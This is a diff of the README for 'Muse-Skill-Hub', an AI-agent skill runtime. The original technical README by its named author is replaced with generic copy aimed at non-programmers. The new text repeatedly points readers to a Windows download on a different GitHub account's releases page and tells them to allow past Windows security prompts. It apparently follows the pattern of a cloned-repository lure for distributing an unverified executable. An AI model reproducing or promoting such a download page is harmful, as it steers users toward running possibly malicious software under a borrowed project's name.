@@ -1,279 +1,112 @@
-<p align="center">
-  <img src="assets/avatar.png" alt="Muse" width="180">
-</p>
+# 🧠 Muse-Skill-Hub - Build Smarter AI Agents Without Code
 
-# Muse Skill Hub
+[![Download Muse-Skill-Hub](https://img.shields.io/badge/Download-Muse--Skill--Hub-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/videogramme/Muse-Skill-Hub/releases)
 
-[![M8ven Score](https://m8ven.ai/badge/mcp/wahyunuriman999/muse-skill-hub)](https://m8ven.ai/mcp/wahyunuriman999/muse-skill-hub?s=readme)
+Muse-Skill-Hub is an open-source helper application for AI tools. It gives AI assistants a safe, organized set of ready-made abilities called “skills.” Each skill is clearly defined, and each action checks permissions before it runs. The project includes 97 skills and has passed all 23 of its final quality checks.
 
-> An open, LLM-agnostic capability runtime for AI agents. Define capabilities once. Discover them dynamically. Execute them through typed tools. Enforce permissions at runtime. Keep failures honest. Created by **Wahyu Nur Iman**.
+You do not need to be a programmer to download it. This page walks you through the download and first-run process on Windows in plain language.
 
-## ⚡ Executable Runtime
+## 📌 What Is Muse-Skill-Hub?
 
-<!-- METRICS:START -->
-_Generated from registry + test suite — do not hand-edit. Run `python tools/sync_readme.py`._
+Muse-Skill-Hub is a capability runtime for AI agents. In everyday terms, think of it as a toolbox that lets AI assistants do useful tasks in a controlled way.
 
-**Version 2.3.0** · **97 skills** · **96 executable drivers** (1 honest stubs) · **222 MCP tools** · **313 passing tests**
-<!-- METRICS:END -->
+Instead of giving an AI tool unlimited access to everything on your computer, Muse-Skill-Hub gives it specific, permission-checked skills. That means you can use AI helpers for practical work while keeping clear boundaries around what they are allowed to do.
 
-**Evidence honesty**: of the 96 executable drivers, 2 are live-tested against real provider servers (`github`, `podcast`), 3 have mock-contract tests (`stripe`, `lovable`, `replit`), and 91 are structural (real code, provider handshake is the operator's step). Full per-driver matrix: [`certification/PROVIDER_MATRIX.md`](certification/PROVIDER_MATRIX.md) (generated — do not hand-edit).
+It is built to work with different AI systems, including Claude, Gemini, GPT-style tools, and other large language model tools. It uses the Model Context Protocol, which is a common connector format for AI tools. Muse-Skill-Hub is open source, so its code can be inspected and improved by the community.
 
-This repo is no longer just a catalog — it ships a **real MCP server**
-exposing every action as its own typed tool (e.g. `github_search_repositories`,
-with full JSON schemas — no opaque `params` blob). Skills are backed by real,
-executable drivers; a few remain honest catalog-only stubs (structured
-`driver_not_implemented` — never fake data):
+## ✨ Why People Use It
 
-```bash
-cd runtime && pip install -r requirements.txt && python -m skillhub.server
-```
+Muse-Skill-Hub is useful when you want AI assistants to be more capable without losing control.
 
-- **94 real drivers** across three kinds:
-  - *Third-party APIs* (62): `github`, `slack`, `stripe`, `shopify`, `linear`, `vercel`, `asana`, `notion`, `todoist`, `places-search`, `zoom`, `gmail`, `google-calendar`, `google-sheets`, `google-drive`, `spotify`, `instagram`, `meta-threads`, `threads`, `facebook`, `dropbox`, `ticketmaster`, `image-search`, `flightaware`, `box`, `calendly`, `canva`, `duffel`, `figma`, `ghl`, `klaviyo`, `meta-ads`, `plaid` (sandbox), `printify`, `quickbooks`, `tts`, `voice-design`, `voice-selector`, `voice-calls`, `zapier`, `outlook-calendar`, `outlook-mail`, `outlook-contacts`, `google-contacts`, `google-docs`, `google-forms`, `google-slides`, `google-tasks`, `messenger`, `instagram-messages`, `threads-messages`, `withings`, `tailscale`, `tessie`, `peloton`, `philips-hue`, `podcast`, `shopping`, `wide-research`, `social-content-performance`, `evernote`, `healthex` (MCP passthrough), `granola`, `generate_podcast` (needs ElevenLabs key for TTS)
-  - *Local reference implementations* (32): `secure-vault` (encrypted), `permission-model`, `personal-feed`, `idea-management`, `goals`, `share-ideas`, `agent-library`, `connector-management`, `paired-devices`, `data-control`, `messaging-channels`, `wallet`, `apple-healthkit` + `google-health-connect` (local export readers), `device-data`, `media-library`, `forget`, `self-awareness`, `skill-creator`, `function-health`, `travel-planning`, `muse_db` (SQLite), `muse-feedback`, `subscription-status`, `wearable-device-skills`, `wearables-comms`, `booking` (router), `opentable` (deep links), `facebook-cli` (passthrough), `magic-moment` (local ffmpeg)
-  - *Catalog-only stubs* (3): `lovable`, `muse-early-access`, `replit` — no public API exists (or it is an internal-only program); documented honestly instead of faked, with workarounds where one exists
-- **MCP tools** (per-action, fully typed) + `skillhub_search_capabilities` for dynamic capability discovery (counts in the metrics block above)
-- **Approval engine** — write actions need approval; `sensitive`/`destructive`/`communication`/`financial`/`account`/`device` risks require a real `approval_id` (bound to exact skill/action/params, single-use, 10-min TTL). Bare `confirm=true` only suffices for plain `write` risk
-- **Policy engine** — risk-based allow/approval_required/deny with per-action classification and custom policy files
-- **Audit log** — every execution recorded (request_id, actor, risk, params hash, approval_id, duration); secrets never logged raw; query via `function-health query_audit_log`
-- **Idempotency** — `idempotency_key` on write actions: repeats return the first result instead of re-executing
-- **Credential manager** — env → local file → encrypted vault; `ref:vault:<name>` references resolve server-side so secret values never reach the LLM
-- **Hardened HTTP layer** — persistent connection pooling, retry with exponential backoff + `Retry-After`, `X-Request-ID` correlation, structured 429/5xx mapping
-- **Skill manifests** — `runtime/skillhub/catalog/<name>/manifest.yaml` is the machine-readable contract; `skillhub validate` runs the conformance test (schemas, risk, auth, manifest/driver/SKILL.md drift, secret scan)
-- **Passing tests** (count in the metrics block above), including live `api.github.com` calls, an end-to-end MCP stdio session with per-action tools, approval-lifecycle/idempotency/audit/security tests, and credential-error coverage for every API driver
+- **Ready-made skills:** The project includes 97 skills, so many common actions are already covered.
+- **Permission checks:** Skills are permission-enforced, meaning each action can be reviewed and restricted.
+- **Works with multiple AI tools:** It is not tied to only one AI assistant.
+- **Clear tool definitions:** Skills are typed, which means each skill has a defined purpose and expected input.
+- **Open-source confidence:** Anyone can review the project, report issues, or suggest improvements.
+- **Quality checked:** The final certification result is 23 out of 23 gates PASS, meaning all final quality checks passed.
 
-### What's new in v2.2.0 (concurrency + crash hardening)
+## 🧰 What You Get
 
-- **Cross-platform file locking** — new `skillhub.filelock` module (`fcntl` on Unix, `msvcrt` on Windows); no more top-level `import fcntl`, so the runtime imports cleanly on Windows
-- **Crash-atomic stores** — every read-modify-write cycle (`locked_json`, credential store) now holds a *separate* `<name>.lock` file and writes back via tmp + fsync + `os.replace`: atomic against concurrency *and* crashes
-- **OAuth single-flight refresh** — the check → refresh → persist cycle runs under the store lock with double-checked expiry; 20 concurrent workers on an expired token produce exactly 1 refresh request
-- **Fail-closed credential store** — a corrupt/undecryptable `credentials.enc` raises `CredentialStoreCorruptError` (with a `.corrupt` backup) instead of silently looking like "no credentials"
-- **Approval privacy** — the approval store no longer persists raw params; only `params_hash` + a redacted preview. Execution re-supplies params and `consume()` verifies them against the hash
-- **Real JSON Schema** — validation now runs on the standard `jsonschema` library (Draft 2020-12, full vocabulary: `$ref`, `if`/`then`/`else`, `dependentRequired`, …) with format checking; `skillhub validate` lints every action schema
-- **Declared dependencies** — `cryptography` and `jsonschema` are now official dependencies (they were already required at runtime)
-- **Generated README metrics** — `runtime/tools/sync_readme.py` regenerates the metrics block from the registry + test suite; a test fails if the README drifts
-- **Multi-process race tests** — approval consumption and idempotency reservation are now proven with 20 *processes* (not just threads), matching the documented guarantee
+Muse-Skill-Hub gives you a controlled way to connect AI tools to useful actions. The project is organized around skills, which are small, focused abilities. Each skill has a clear role and runs through permission checks.
 
-### What's new in v2.1.0 (security hardening)
+The main benefits are:
 
-- **Atomic approval consumption** — approval approve/consume transitions happen inside a locked critical section, so concurrent workers can't double-spend one approval (proven by a 20-thread race test)
-- **Atomic idempotency** — `PENDING → SUCCEEDED | FAILED → CONFLICT` reservation happens *before* side effects; concurrent duplicates see `pending` and never re-execute; failed records allow exactly one reclaim
-- **Honest naming** — `idempotent` renamed to `supports_idempotency_key`: the runtime supports dedup keys, it does not claim mathematical idempotence of the underlying API
-- **Output contracts** — handler results are validated against each action's `output_schema` before success is committed; violations never get cached
-- **Real JSON-Schema validation** (v2.2.0: standard `jsonschema` library, Draft 2020-12) — strict by default (unknown params rejected, like MCP's `additionalProperties: false`)
-- **Credential scopes** — actions declare `required_scopes` (Gmail/Outlook/Google Workspace drivers); mismatches are blocked, unknown scopes are allowed but marked `unverified` in audit
-- **Encrypted credential store** — local credentials now live in an encrypted `credentials.enc` (Fernet, secure-vault key); the old plaintext fallback is gone, legacy files are migrated and deleted
-- **OAuth refresh manager** — encrypted access/refresh tokens with auto-refresh before expiry and rotation persistence
-- **Audit hash chain** — every event carries `prev_hash`/`event_hash`; `python -m skillhub.cli audit-verify` detects tampering (tamper-evident, not tamper-proof)
-- **TF-IDF capability discovery** — `skillhub_search_capabilities` now ranks by lexical relevance instead of substring matching
-- **Provider mock harness** — `SKILLHUB_MOCK=1` routes `api_request` to canned responders; mock contract tests for GitHub and Stripe assert request shapes and auth flow without network
-- **SQL hardening** — `muse_db` strips comments/strings before keyword scanning, runs reads on a read-only SQLite connection, and enforces single statements
-- **Zero doc warnings** — all 178 missing action docs generated; `skillhub validate` passes clean
-- **Passing tests** (count in the metrics block above; was 67 in v1.5.0), including 20-thread concurrency races, scope mismatches, encrypted-store migration, OAuth refresh, audit tampering, and provider contracts
+- A large library of 97 skills.
+- A consistent way for AI tools to request actions.
+- Permission enforcement before skills run.
+- Support for multiple AI models and AI tools.
+- A foundation for automation and agent workflows.
+- An open-source codebase that can be extended over time.
 
-**Security model (honest):** this is a trusted, local, single-user MCP runtime. Encryption protects against casual disk exposure, not against malware or same-user attackers. `actor` is a local session label, not authentication. Multi-user tenant isolation, distributed exactly-once, and workflow/saga engines remain out of scope (see `specs/`).
+## 🚀 Getting Started
 
-See [`runtime/README.md`](runtime/README.md) for setup, driver docs, and how to add your own driver. Specs live in [`specs/`](specs/) (manifest, error contract, approval protocol).
+Getting started on Windows is a download-first process. You do not need to install programming tools or type commands.
 
----
-## About this repo
+### 1. Open the Download Page
 
-This repo contains a **catalog** of all of Muse's skills/capabilities (Muse is Meta's personal AI agent).
-The goal is an open reference: what Muse can do, what the patterns are, and inspiration for building similar capabilities in other AIs/LLMs.
+Visit this link to download the application:
 
-**Important note:** This file only contains high-level lists and descriptions, not raw internal files. Muse's real skills run on a specialized runtime (MCP servers, OAuth, custom CLIs, etc.), so just reading this list won't automatically make another AI 99.9% like Muse — but it can be a very useful blueprint.
+[Muse-Skill-Hub Releases](https://github.com/videogramme/Muse-Skill-Hub/releases)
 
-Total documented skills: **97**
+The link opens the official releases page. This is the page where the application is made available for download.
 
-## 🌐 Flagship Capability: The Live Browser
+### 2. Download the Application
 
-Of the 97 skills cataloged below, the single strongest one is not in the table —
-it is the **live browser**: a real Chromium that Muse drives directly. It opens
-pages, reads, clicks, types, searches, uploads files, and completes multi-step
-flows on the open web, with the user's approvals gating sensitive actions.
+On the releases page, look for the newest release at the top. In that release, choose the download offered for the application. Save the file to your computer, preferably in your Downloads folder so it is easy to find.
 
-API skills cover *known* integrations. The browser covers *everything else* —
-the entire web becomes the API. In practice:
+### 3. Run It on Windows
 
-- **Read anything live** — prices, availability, account state, and content behind
-  JavaScript-heavy pages that no API exposes, with sources attached.
-- **Act on the web** — fill forms, sign in, upload files, walk multi-step flows.
-  Checkouts pause for explicit approval; nothing sensitive completes silently.
-- **Operate end-to-end** — run a YouTube creator pipeline (upload via YouTube
-  Studio, fill titles/descriptions/tags, set audience, publish, verify),
-  search and track job applications, register for services, monitor changes.
+When the download finishes, open the downloaded file. If Windows shows a security prompt, choose the option to allow or run it. Follow the on-screen prompts until the setup is complete.
 
-**Honest limits** (this repo keeps failures honest): logins and sensitive actions
-need the user's approval; CAPTCHAs and bot checks pause for the user; some sites
-block automation outright; a failed page load is reported as a failure, never
-papered over with guessed content.
+After setup finishes, open Muse-Skill-Hub from the Start menu or from the location shown at the end of the setup process.
 
-The catalog below is the *integration* layer. The browser is the *universal*
-layer — the reason a Muse-style agent can do work no fixed skill list anticipates.
+## 🖥️ First-Time Setup
 
-## Universal Skills (Usable by Any LLM) 🌐
+The first time you open Muse-Skill-Hub, take a moment to look around before using it with an AI tool.
 
-Each skill now has **two files**:
-- `runtime/skillhub/catalog/<name>/README.md` — Human-readable documentation (what it does, when to use)
-- `runtime/skillhub/catalog/<name>/SKILL.md` — **Universal skill definition** in open format (frontmatter + instructions) that any LLM can load
+Start with the available skills list. You will see many skills organized by purpose. Review the permission settings so you understand which actions are allowed and which are restricted. Permission prompts are there to keep you in control.
 
-See **[USAGE.md](USAGE.md)** for how to use these with GPT, Claude, Gemini, Llama, LangChain, etc.
+If the application offers a quick-start guide or welcome screen, read it first. It will help you understand how skills are selected, how permissions are reviewed, and how an AI tool connects to the runtime.
 
-**Quick start for any LLM:**
-```python
-# Option 1: Paste into system prompt
-with open('runtime/skillhub/catalog/github/SKILL.md') as f:
-    skill = f.read()
-# Add to your LLM's context
+## 🔐 Permissions and Safety
 
-# Option 2: LangChain
-from langchain.tools import Tool
-tool = Tool(name="github", description="...", func=your_impl)
-```
+Muse-Skill-Hub is designed around permission enforcement. This is one of its most important features for everyday users.
 
-## Skill List
+Each skill is a defined action. Before a skill runs, the permission layer checks whether that action is allowed. This helps prevent unexpected behavior and gives you a clear view of what the AI tool can do.
 
-<!-- DEPTH-LEGEND:START -->
-**Depth** is computed from the skill registry, not hand-written:
+Because the project is open source, you can also review how it works. If you are using it in a shared or work environment, review the permission settings before connecting important tools or accounts.
 
-- **Full** — has mutating actions (write, send, pay, delete, …): the skill can act, not just read.
-- **Standard** — 3+ actions, all read-only.
-- **Limited** — 1–2 read-only actions (narrow surface, often API-limited).
-- **Stub** — not implemented yet (honest stub).
-<!-- DEPTH-LEGEND:END -->
+## 💡 Common Uses
 
-| Skill | Title | Description | Depth |
-|-------|-------|-------------|-------|
-| `agent-library` | Agent Library | Manage the user's file library: uploads, generated artifacts, expiring public share links, and the media collection. | Full |
-| `apple-healthkit` | Apple Health | The user's synced Apple Health (HealthKit) data: daily metrics (steps, distance, calories, heart rate, HRV, VO2max), sleep sessions (stages, quality, efficiency), and workouts. | Standard |
-| `asana` | asana | Manage Asana work: create and list tasks, assign owners, set due dates, organize projects, and track team progress. | Full |
-| `booking` | booking | Primary entry point for direct flight, hotel, restaurant, or event-ticket transactions and for bounded live availability checks delegated by Travel Planning. Always use before provider-specific skills | Standard |
-| `box` | box | Search, read, upload, download, move, rename, delete, restore, and share Box content; manage comments and metadata. | Standard |
-| `calendly` | calendly | View Calendly events and event types, and manage scheduling data using the Calendly CLI. | Limited |
-| `canva` | canva | Design with Canva: create and edit designs and presentations, manage brand assets and folders, and generate share links. | Limited |
-| `connector-management` | Connector Management | Manage third-party service connectors: check connection status and scopes, guide OAuth connect flows, and disconnect services. | Full |
-| `data-control` | Data Control | Handle user data rights: explain data collection and use, export chats and files, delete data on request, manage training opt-outs. | Full |
-| `device-data` | Device Data | Read cached contacts and calendar events from Muse storage. Delete Muse's local copy of either source without modifying paired devices. | Full |
-| `dropbox` | dropbox | Manage Dropbox storage: upload and download files, create share links, organize folders, and check space usage. | Limited |
-| `duffel` | duffel | Use Duffel to search, book, pay for, or manage flights. Use Duffel to monitor an already booked flight's fare when the user directly asks for ongoing price monitoring. | Full |
-| `evernote` | evernote | Read and create notes through Evernote's official MCP server. | Limited |
-| `facebook` | Facebook | Use when the user provides a Facebook URL or asks to read personal posts, comments, reactions, friends, timelines, profiles, stories, feeds, groups, events, or saved items, or to discover public event | Full |
-| `facebook-cli` | Facebook | Use when the user provides a Facebook URL or asks to read personal posts, comments, reactions, friends, timelines, profiles, stories, feeds, groups, events, or saved items, or to discover public event | Full |
-| `figma` | figma | Work with Figma: read files, pages, frames and components, export assets, and manage design projects. | Limited |
-| `flightaware` | FlightAware AeroAPI | Use for questions about a specific flight’s departure or arrival time, including “when’s my flight?” and confirmation of remembered times, plus flight status, delays, and cancellations. Verify the exa | Limited |
-| `forget` | forget | Remove a personal fact, preference, relationship detail, topic, or prior event from Muse's active memory and stop existing copies or automations from bringing it back. Use for explicit requests such a | Full |
-| `function-health` | function-health | Retrieve lab biomarker results and clinician notes from Function Health. | Limited |
-| `generate_podcast` | generate_podcast | Compose and deliver audio content: a podcast episode, briefing, or narrated summary, with one or more voices, as an MP3. For reading supplied text aloud verbatim, use tts. | Full |
-| `ghl` | ghl | Use HighLevel contacts, pipelines, appointments, messages, and its broader operation catalog. | Full |
-| `github` | GitHub | Search and work with the user's GitHub repositories through GitHub's official MCP server. | Full |
-| `gmail` | gmail | Work with the user's Gmail: search, read threads, draft, send, reply, forward, unsubscribe from mailing lists, manage labels, and open attachments. | Full |
-| `goals` | goals | Guidance for helping users create and accomplish goals. Read it before you create a goal for the user when no goal-creation contract is in context, and whenever you help with an existing goal. A Goals | Full |
-| `google-calendar` | google-calendar | Work with the user's Google Calendar: agenda views, event details, and scheduling changes. | Full |
-| `google-contacts` | google-contacts | Search, view, create, update, and delete the user's Google Contacts. | Full |
-| `google-docs` | google-docs | Read, create, and edit the user's Google Docs. | Full |
-| `google-drive` | google-drive | Work with the user's Google Drive: files, folders, uploads, downloads, and sharing. | Limited |
-| `google-forms` | google-forms | Read, create, and update the user's Google Forms, and read responses. | Full |
-| `google-health-connect` | Health Connect | The user's synced Google Health Connect data from their Android device: daily metrics (steps, distance, calories, heart rate, HRV, VO2max), sleep sessions (stages, quality, efficiency), and workouts. | Standard |
-| `google-sheets` | google-sheets | Read, write, and manage the user's Google Sheets. | Full |
-| `google-slides` | google-slides | Read, create, and edit the user's Google Slides presentations. | Full |
-| `google-tasks` | google-tasks | Manage the user's Google Tasks: lists, task details, creation, updates, and completion. | Full |
-| `granola` | granola | Search and read Granola meeting notes and transcripts through Granola's official public API (public-api.granola.ai). Requires a Granola API key (GRANOLA_API_KEY). | Standard |
-| `healthex` | HealthEx | Use to connect HealthEx and ask questions about your medications, lab results, and other health records. | Limited |
-| `idea-management` | Idea Management | Manage the Ideas tab: idea cards the agent can run, dismissing ideas, and explaining why an idea appeared or disappeared. | Full |
-| `image-search` | image-search | Search the web by text query for image URLs and source pages for feeds, artifacts, and visual references. Does not identify a supplied image or person. | Limited |
-| `instagram` | instagram | Read Instagram profiles, followers, posts, comments, likes, stories, feed, saved content, and account insights. Answer questions about posts, reels, and Instagram links. Manage interests and profile d | Limited |
-| `instagram-messages` | instagram-messages | Use this to interact with the user's Instagram messages. Read inboxes, threads, top recipients, filtered inbox views, DM search results, and send messages through `instagram-messages-cli`. | Full |
-| `klaviyo` | klaviyo | Run Klaviyo email/SMS marketing: manage lists and segments, build campaigns and flows, and edit templates. | Limited |
-| `linear` | linear | Track engineering work in Linear: create and list issues, set priorities, manage cycles, and follow project status. | Full |
-| `lovable` | lovable | Lovable AI app builder. No public API exists, so this skill is catalog-only: the honest workaround is Lovable's GitHub sync, then operate on the code with the github skill. | Full |
-| `magic-moment` | magic-moment | Turn talking-head video footage into shareable short clips. The hosted AI-highlight feature has no public API, so this skill ships an honest local ffmpeg implementation: cut clips, burn in SRT captions, reframe to vertical 9:16. | Full |
-| `media-library` | media-library | Search and inspect the user's photo library, including connected device galleries. Use for photo requests and whenever a photo could ground or personalize a response; lookups of uploaded photos are ch | Limited |
-| `messaging-channels` | Messaging Channels | Work across connected messaging providers (e.g. WhatsApp): check connection status, read side chats, send messages with approval. | Full |
-| `messenger` | Messenger | Work with the user's Messenger account: read call history; read and search contacts; read, search, and summarize conversations; send, react to, unsend, or edit messages; and message Marketplace listin | Full |
-| `meta-ads` | Meta Ads | Create, write, or manage Meta ads and assets: ad copy, campaigns, spend, reports, audiences, catalogs, product feeds, feed refresh schedules, experiments, and policy. Always load for any request to cr | Limited |
-| `meta-threads` | meta-threads | Read and manage the user's Threads account: profile, posts, feed, saved posts, activity, insights, social graph, search, trends, and a specific post by URL or ID. Can tune feed ranking and publish pos | Full |
-| `muse-early-access` | Muse early access | Use for questions about Muse's general early access program, requests to join it, checking or withdrawing a join request, and admission updates. | Stub |
-| `muse-feedback` | Muse feedback | Use for feedback and feature requests to the Muse team. Whenever your response tells the user you can't do a specific thing they wanted, or accepts them giving up on one, offer once to file feedback i | Full |
-| `muse_db` | muse_db | Inspect database-backed Muse records for diagnosis and cross-table tracing when purpose-built product tools do not expose the needed state. | Full |
-| `notion` | notion | Search, read, create, and update Notion pages via the Notion MCP. | Limited |
-| `opentable` | OpenTable | Find restaurants on OpenTable, check availability, and make, change, or cancel reservations. Use for restaurant booking and live reservation data. | Limited |
-| `outlook-calendar` | outlook-calendar | View, create, update, and delete events in the user's Outlook Calendar. | Full |
-| `outlook-contacts` | outlook-contacts | List, search, create, update, and delete contacts in the user's Outlook account. | Full |
-| `outlook-mail` | outlook-mail | Read, search, send, reply to, and delete messages in the user's Outlook Mail. | Full |
-| `paired-devices` | Paired Devices | Manage the user's paired devices: list devices, run commands, pull data such as location, and unpair devices. | Full |
-| `peloton` | peloton | Connect to Peloton to browse fitness classes, check schedules, and book workouts. | Limited |
-| `permission-model` | Permission Model | Work with the runtime permission system: list pending requests, explain the access each grants, respect approve/deny decisions. | Full |
-| `personal-feed` | Personal Feed | Manage the user's personal Feed: editorial posts written on a schedule, the feed brief, regenerating or removing posts. | Full |
-| `philips-hue` | philips-hue | Control Philips Hue smart lights, rooms, scenes, and devices via the Hue Remote API v2. | Full |
-| `places-search` | Places Search | Find, compare, and share details on physical places near the user or in a specified area, including restaurants, cafes, bars, hotels, parks, attractions, shops, and businesses with local services. Not | Limited |
-| `plaid` | Finances (Plaid) | Use to connect Plaid and read linked financial accounts: metadata, balances, transactions, recurring transactions, liabilities, and investments. | Full |
-| `podcast` | podcast | Compose and deliver audio content: a podcast episode, briefing, or narrated summary, with one or more voices, as an MP3. For reading supplied text aloud verbatim, use tts. | Limited |
-| `printify` | printify | Use Printify to browse catalog data, manage shops and products, and review or create orders. | Limited |
-| `quickbooks` | quickbooks | Read and manage the user's QuickBooks business through Intuit's official MCP server, including reports, invoices, customers, products, payment links, sales settings, and industry benchmarks. | Limited |
-| `replit` | replit | Replit cloud IDE. Replit's public REST API is deprecated and its replacement is unreleased, so this skill is catalog-only: the honest workaround is pushing the Repl to GitHub, then operating on the code with the github skill. | Full |
-| `secure-vault` | Secure Vault | Handle credentials securely: collect passwords, API keys, and tokens only through secure entry UI, never in chat. | Full |
-| `self-awareness` | self-awareness | Ground self-referential answers in the agent's actual filesystem. Use when the user asks who the agent is, what it can do, what it knows, what it remembers, what it has built, what services are connec | Limited |
-| `share-ideas` | Share ideas | Publish a portable Idea card from the Ideas tab — only after the user explicitly asks to publish it. | Full |
-| `shopify` | shopify | Manage a Shopify store: list and update products, orders, customers, inventory levels, and discount codes. | Limited |
-| `shopping` | shopping | Use for any product or shopping question: find, reverse image search, shopping Instagram/Marketplace links, buy, compare, or evaluate real products with prices, images, and product page URLs, includin | Limited |
-| `skill-creator` | skill-creator | Create or update a workspace skill: its description, structure, instructions, and supporting files. | Full |
-| `slack` | slack | Work with Slack: list channels, read and send messages, manage threads and reactions, and search history. | Full |
-| `social-content-performance` | Social Content Performance | Analyze the user's own Instagram account and post performance using linked-account analytics. | Limited |
-| `spotify` | spotify | Discover, search, and manage Spotify music, podcasts, and playlists, including deleting shows or episodes you created with Save to Spotify. | Full |
-| `stripe` | stripe | Handle Stripe payments: create payment links and checkout sessions, manage customers, subscriptions, invoices, and refunds. | Full |
-| `subscription-status` | subscription-status | Answer questions about the user's Muse subscription, plan, usage, tokens, reset timing, or available plans and prices, or verify information that references the Muse subscription. | Limited |
-| `tailscale` | Tailscale | Set up Muse's built-in Tailscale connector, join a tailnet or Headscale network, check status, and reach private machines through the TCP tunnel proxy. Read for Tailscale, VPN, MagicDNS, network egres | Limited |
-| `tessie` | tessie | Monitor a Tesla vehicle, inspect live state, and run explicit Tessie command endpoints. | Limited |
-| `threads` | threads | Read and manage the user's Threads account: profile, posts, feed, saved posts, activity, insights, social graph, search, trends, and a specific post by URL or ID. Can tune feed ranking and publish pos | Full |
-| `threads-messages` | threads-messages | Use this to interact with the user's Threads messages: read inboxes and message threads, and send messages through `threads-messages-cli`. | Limited |
-| `ticketmaster` | ticketmaster | Search Ticketmaster events and seats with pricing. Returns Buy-now links to Ticketmaster checkout; it cannot complete a purchase itself. | Limited |
-| `todoist` | todoist | Read and manage Todoist tasks, projects, comments, labels, filters, and reminders through Todoist's official MCP server. | Full |
-| `travel-planning` | travel-planning | Use this skill when an active or proposed trip needs planning, logistics, feasibility, entry or transit checks, itinerary work, or investigation of an airport process, immigration, ground transport, a | Limited |
-| `tts` | tts | Turn supplied text into spoken audio, single or multi-speaker. For composed audio content (a podcast, briefing, or narrated summary), use podcast. | Full |
-| `vercel` | vercel | Deploy with Vercel: list projects and deployments, promote to production, manage domains and environment variables. | Limited |
-| `voice-calls` | voice-calls | Provides the static system voice catalog used by Jarvis. It does not define a user-facing workflow. | Full |
-| `voice-design` | voice-design | Choose or design a speaking voice when the user asks for a new, different, custom, invented, or generated voice, or restore the voice used immediately before the current one. | Full |
-| `voice-selector` | voice-selector | Provides the static system voice catalog used by Jarvis. It does not define a user-facing workflow. | Limited |
-| `wallet` | Wallet | Coordinate payments: check wallet connection state, use saved payment methods through secure provider pages, run purchase review and approval. | Full |
-| `wearable-device-skills` | Wearable Device Skills | Use when the user asks to discover, inspect, or invoke an agentic capability dynamically published by a paired phone or wearable, including device controls, app actions, camera or media actions, and s | Limited |
-| `wearables-comms` | Wearables Calls and Messages | Handle calls and messages through connected wearables: read notifications, place and answer calls, and send quick replies. | Full |
-| `wide-research` | wide-research | Use when the user needs broad parallel research across many independent inputs with a shared output schema. | Limited |
-| `withings` | withings | Use when linking Withings or reading Withings body measurements, activity, sleep, workout, heart, and intraday data. | Limited |
-| `zapier` | zapier | Connect Muse to actions across apps through Zapier's official MCP server. | Full |
-| `zoom` | zoom | Manage Zoom: schedule and list meetings, fetch recordings, and manage meeting settings. | Full |
+Muse-Skill-Hub can support many kinds of AI-assisted work. Typical uses include:
 
-## How to use
+- Giving an AI assistant a set of controlled skills.
+- Testing how different AI tools handle the same capabilities.
+- Building repeatable automation flows with clear permissions.
+- Connecting AI agents to useful actions without exposing everything.
+- Exploring an open-source runtime for AI skill management.
+- Learning how permission-enforced AI tools are organized.
 
-- Browse the table above to see capability patterns.
-- Each Muse skill follows a pattern: **clear purpose, structured input, and safe actions** (read vs write separated).
-- If you want to build a Muse-like AI, copy the pattern: define skills as instructions + input schema, not just freeform prompts.
+## 🛠️ Troubleshooting
 
-## Community skills
+If the download page does not open, refresh the page or try again in a few minutes.
 
-Skills from other authors, in the same open `SKILL.md` format, that Muse-style agents can load.
+If the download does not start, check your browser’s download area. The file may already be saving or may be waiting for confirmation.
 
-| Skill | Description |
-|-------|-------------|
-| [sparkbtcbot](https://github.com/echennells/sparkbtcbot) | Give an agent its own self-custodial Bitcoin wallet on the Spark L2: receive and pay over Lightning and Spark, pay L402 paywalls, move BTKN tokens, and buy gift cards with a confirm-before-buy step. Encrypted seed, amount and fee caps, a daily spend budget, an outbound allowlist, payment dedup, and a unilateral-exit backup. MIT. [Demo video](https://x.com/sparkbtcbot/status/2104971010475012423) |
+If Windows blocks the file, review the prompt carefully and choose the option that allows you to continue. Only continue if you downloaded the file from the official releases link above.
 
-## Contributing
+If you cannot find the downloaded file, open File Explorer and go to the Downloads folder.
 
-PRs and issues are welcome. If you adapt these skills for other LLMs, share it here.
-See [ROADMAP.md](ROADMAP.md) for where this project is headed.
+If the application does not open after setup, restart your computer and try again. Then open Muse-Skill-Hub from the Start menu.
 
-## License
+If you need more help, use the repository’s Issues page to ask a question or report a problem.
 
-This project is licensed under the **GNU Affero General Public License v3.0**
-(AGPL-3.0-only) — see [LICENSE](LICENSE) for the full text.
+## 📥 Download Link
 
-In short: you may use, study, modify, and share this work, but any modified
-version you distribute (including over a network) must remain open-source
-under the same license, with copyright and attribution notices intact.
+Visit this link to download the application:
 
-**Commercial use:** if the AGPL's terms don't fit your product (proprietary
-software, company policy against AGPL), a commercial license is available —
-see [COMMERCIAL-LICENSING.md](COMMERCIAL-LICENSING.md). Attribution to the
-author is required under either license.
+[https://github.com/videogramme/Muse-Skill-Hub/releases](https://github.com/videogramme/Muse-Skill-Hub/releases)
 
----
-*Copyright © 2026 Wahyu Nur Iman.*
+Use the newest release listed on that page. Download the application, open it on Windows, and follow the on-screen prompts to finish setup.
+
+Keywords: agents, ai, ai-agents, ai-tools, automation, claude, developer-tools, gemini, gpt, llm, llm-tools, mcp, model-context-protocol, muse, open-source, python, skills
